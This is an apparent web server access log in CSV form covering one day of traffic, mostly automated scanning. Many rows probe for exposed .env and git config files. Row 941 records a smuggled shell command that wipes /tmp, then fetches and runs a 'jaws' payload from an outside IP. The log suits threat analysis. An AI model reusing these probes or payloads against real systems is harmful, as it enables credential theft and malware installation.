,Timestamp,Method,Protocol,Status,Referer,Path,Host,UA,Payload,Bytes
887,2023-09-13 02:57:52,GET,HTTP/1.1,404,,/back/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
888,2023-09-13 02:57:52,GET,HTTP/1.1,404,,/.env.prod.local,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
889,2023-09-13 02:57:52,GET,HTTP/1.1,404,,/prod/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
890,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/.env.travis,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
891,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/actuators/env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
892,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/.env.test.sample,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
893,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/.env.2,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
894,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/.vscode/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
895,2023-09-13 02:57:53,GET,HTTP/1.1,404,,/.env.local,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
896,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/env/,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
897,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/en/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
898,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/config/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
899,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/.env.txt,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
900,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/api/src/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
901,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/app/config/dev/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
902,2023-09-13 02:57:54,GET,HTTP/1.1,404,,/sendgrid.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
903,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/.env.save,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
904,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/printenv.tmp,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
905,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/.flaskenv,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
906,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/d/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
907,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/manual/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
908,2023-09-13 02:57:55,GET,HTTP/1.1,404,,/actuator/env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
909,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/.env.test.local,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
910,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/bootstrap/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
911,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/.jenv-version,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
912,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/system/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
913,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/script/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
914,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/development/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
915,2023-09-13 02:57:56,GET,HTTP/1.1,404,,/images/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
916,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/management/env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
917,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/mailer/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
918,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/docs/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
919,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/v2/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
920,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/src/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
921,2023-09-13 02:57:57,GET,HTTP/1.1,404,,/.envrc,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
922,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/kyc/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
923,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/.env.dist,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
924,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/env.bak/,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
925,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/.env.sample.php,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
926,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/backend/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
927,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/.env1,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
928,2023-09-13 02:57:58,GET,HTTP/1.1,404,,/site/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
929,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/.venv,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
930,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/.docker/laravel/app/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
931,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/scripts/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
932,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/staging2/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
933,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/.env~,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
934,2023-09-13 02:57:59,GET,HTTP/1.1,404,,/content/.env,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
935,2023-09-13 02:58:00,GET,HTTP/1.1,404,,/env.prod.js,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
936,2023-09-13 02:58:00,GET,HTTP/1.1,404,,/env.test.js,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
937,2023-09-13 02:58:00,GET,HTTP/1.1,404,,/env.bak,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
938,2023-09-13 02:58:00,GET,HTTP/1.1,404,,/env.php,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
939,2023-09-13 02:58:00,POST,HTTP/1.1,405,,/,13.215.141.253,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,568
940,2023-09-13 03:40:01,,,400,,,198.235.24.124,,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03}'3\xD3Q\xF39\xC1\xB8\xFBzG\xAA\x03\x8C\xB0\xB5\xD6\x5C\x85\xC2^\x8D=\xA5\xA0\xB9\x0FT\xADN\xA9\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0",166
941,2023-09-13 04:02:44,GET,HTTP/1.1,404,,/shell?cd+/tmp;rm+-rf+*;wget+ 95.214.24.125/jaws;sh+/tmp/jaws,91.233.145.131,,,162
942,2023-09-13 04:06:45,GET,HTTP/1.1,404,,/.git/config,54.167.19.118,,,134
943,2023-09-13 04:38:21,GET,HTTP/1.0,200,,/,139.162.84.205,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,612
944,2023-09-13 04:53:39,,,400,,,205.210.31.18,,\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03L\xF3\xFDa\xF4\x5C\x8B\x22\xA9\xCC\x07\xD4,166
945,2023-09-13 05:05:06,GET,HTTP/1.1,200,,/,103.43.18.241,,,396
946,2023-09-13 05:05:07,GET,HTTP/1.1,404,,/favicon.ico,103.43.18.241,,,134
947,2023-09-13 05:05:08,GET,HTTP/1.1,404,,/favicon.ico,103.43.18.241,,,134
948,2023-09-13 05:30:24,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
949,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
950,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
951,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
952,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
953,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
954,2023-09-13 05:30:27,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
955,2023-09-13 05:30:28,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
956,2023-09-13 05:30:28,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
957,2023-09-13 05:30:28,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
958,2023-09-13 05:30:29,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
959,2023-09-13 05:30:29,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
960,2023-09-13 05:30:29,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
961,2023-09-13 05:30:29,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
962,2023-09-13 05:30:29,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
963,2023-09-13 05:30:30,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
964,2023-09-13 05:33:02,GET,HTTP/1.1,404,,/.env,185.254.196.186,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
965,2023-09-13 05:33:03,POST,HTTP/1.1,405,,/,185.254.196.186,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,568
966,2023-09-13 05:35:17,GET,HTTP/1.1,200,,/,35.203.211.32,,,612
967,2023-09-13 06:39:46,POST,HTTP/1.1,404,http://43.202.84.178:80/admin/login.asp,/boaform/admin/formLogin,95.214.55.115,,,134
968,2023-09-13 06:39:46,,,400,,,95.214.55.115,,,0
969,2023-09-13 07:16:27,GET,HTTP/1.0,200,,/,218.64.5.131,,,612
970,2023-09-13 07:18:13,GET,HTTP/1.1,404,,/.env,109.237.98.226,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
971,2023-09-13 07:18:14,,,400,,,109.237.98.226,,"\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xE5S}\xA3\xBDb\x9B\x03\xD0\xCE\xF0g\x1E\x9D~nNb_\x1F\xC2\xEE\x83\x90\x82\x0B~\xF6M\x00\xEB\x88 \xA1\xF6\xF1\x0Er\x00\xB4\xA5)\x09e9q\x89P-\x92\xFC:%\x85\xF7\xC9\xC8n\x93\x93\xDFq\x1BCk\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0",166
972,2023-09-13 07:30:46,GET,HTTP/1.1,304,,/,106.246.235.109,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,0
973,2023-09-13 07:33:45,GET,HTTP/1.1,200,,/,106.240.19.114,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,396
974,2023-09-13 07:33:45,GET,HTTP/1.1,404,http://43.202.84.178/,/favicon.ico,106.240.19.114,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",,197
975,2023-09-13 07:39:52,GET,HTTP/1.0,200,,/,198.235.24.82,,,612
976,2023-09-13 07:49:29,,,400,,,45.79.181.223,,"\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xF0\xC7\xC4%Q\xD2\xCCa_\xA8\xAE\xE8\x8A\xBDY\xA6\xF4\xDA(\xBF\xAB:\xFAB\xF8^Q\x87\xF0\x86gu\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",166
977,2023-09-13 08:15:35,GET,HTTP/1.1,200,,/,192.241.193.6,,,396
978,2023-09-13 08:41:38,GET,HTTP/1.0,200,,/,139.162.84.205,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,612
979,2023-09-13 09:01:45,GET,HTTP/1.1,200,,/,95.214.55.115,,,396
980,2023-09-13 09:03:58,GET,HTTP/1.1,404,,/.env,185.254.196.173,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
981,2023-09-13 09:03:59,POST,HTTP/1.1,405,,/,185.254.196.173,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,568
982,2023-09-13 09:22:14,GET,HTTP/1.0,200,,/,198.235.24.142,,,612
983,2023-09-13 09:50:20,,,400,,,45.79.181.223,,"\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xFFQ\xEE|E8P\x84~\xC6\x1C\xBF\xFFc\x9CZ\xC4\x9A\xEB\xF0x\xDC\x1A\xFFj\xF6>\x1F\xD4\xE0\xB0\x0E\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",166
984,2023-09-13 10:03:03,GET,HTTP/1.1,200,,/,168.232.15.102,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",,612
985,2023-09-13 10:16:16,GET,HTTP/1.1,200,,/,65.49.20.67,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",,396
986,2023-09-13 10:16:19,GET,HTTP/1.1,200,,/,35.216.157.187,,,396
987,2023-09-13 10:17:50,GET,HTTP/1.1,404,,/favicon.ico,65.49.20.67,,,134
988,2023-09-13 10:18:42,GET,HTTP/1.1,404,,/geoserver/web/,65.49.20.67,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",,197
989,2023-09-13 10:55:21,,,400,,,5.188.210.227,,\x05\x01\x00,166
990,2023-09-13 10:55:31,GET,HTTP/1.0,404,,/systembc/password.php,45.56.108.128,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",,564
991,2023-09-13 11:08:04,,,400,,,92.63.196.57,,\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00,166
992,2023-09-13 11:08:43,GET,HTTP/1.1,404,,/aaa9,139.59.58.140,,,134
993,2023-09-13 11:08:56,GET,HTTP/1.1,404,,/aab8,139.59.58.140,,,134
994,2023-09-13 11:09:05,GET,HTTP/1.1,200,,/,139.59.58.140,,,396
995,2023-09-13 11:16:40,HEAD,HTTP/1.1,404,,/Core/Skin/Login.aspx,43.155.118.219,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",,0
996,2023-09-13 11:17:52,GET,HTTP/1.1,404,https://www.google.com/,http://5.188.210.227/echo.php,5.188.210.227,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",,197
997,2023-09-13 11:27:59,GET,HTTP/1.1,200,,/,167.94.146.53,,,612
998,2023-09-13 11:27:59,GET,HTTP/1.1,200,,/,167.94.146.53,,,396
999,2023-09-13 11:28:00,,HTTP/2.0,400,,,167.94.146.53,,,166
1000,2023-09-13 11:28:00,GET,HTTP/1.1,404,,/favicon.ico,167.94.146.53,,,134
1001,2023-09-13 11:49:28,,,400,,,172.104.11.4,,"\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xBC\xFC\x12t\xEB\x85\xE6\x81\xDC\xF2\xC7\xD2%q\x08\x06y\x12\x992b\xE1\x1B\x1B\x96\x8Fw*\xDCh!\x06\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",166
1002,2023-09-13 12:26:14,,,400,,,64.62.197.144,,\x16\x03\x01\x00{\x01\x00\x00w\x03\x03#[+^s\xAF\xECY\x0E\x8B!\xA0#\x9Bn\xE23\x96\x0B\x93X\xA4\x95\xA0x\x8C5\xA1j\x91\xFF\xB3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0,166
1003,2023-09-13 12:35:08,GET,HTTP/1.0,200,,/,120.0.52.217,,,612
1004,2023-09-13 12:38:32,GET,HTTP/1.1,200,,/,34.77.127.183,,,396
1005,2023-09-13 12:44:42,GET,HTTP/1.0,200,,/,139.162.84.205,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",,612
1006,2023-09-13 12:47:29,GET,HTTP/1.1,200,,/,208.76.202.164,,,612
1007,2023-09-13 12:51:53,HEAD,HTTP/1.1,404,,/Core/Skin/Login.aspx,43.155.118.219,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",,0
1008,2023-09-13 13:02:54,GET,HTTP/1.1,404,,/.env,185.254.196.173,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
1009,2023-09-13 13:02:58,POST,HTTP/1.1,405,,/,185.254.196.173,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,568
1010,2023-09-13 13:26:01,GET,HTTP/1.1,200,,/,185.36.81.33,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",,396
1011,2023-09-13 13:29:03,GET,HTTP/1.1,404,,/.env,109.237.97.180,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,197
1012,2023-09-13 13:32:19,GET,HTTP/1.1,200,,/,223.83.130.192,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,612
1013,2023-09-13 13:32:19,GET,HTTP/1.1,404,,/favicon.ico,111.33.20.64,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,564
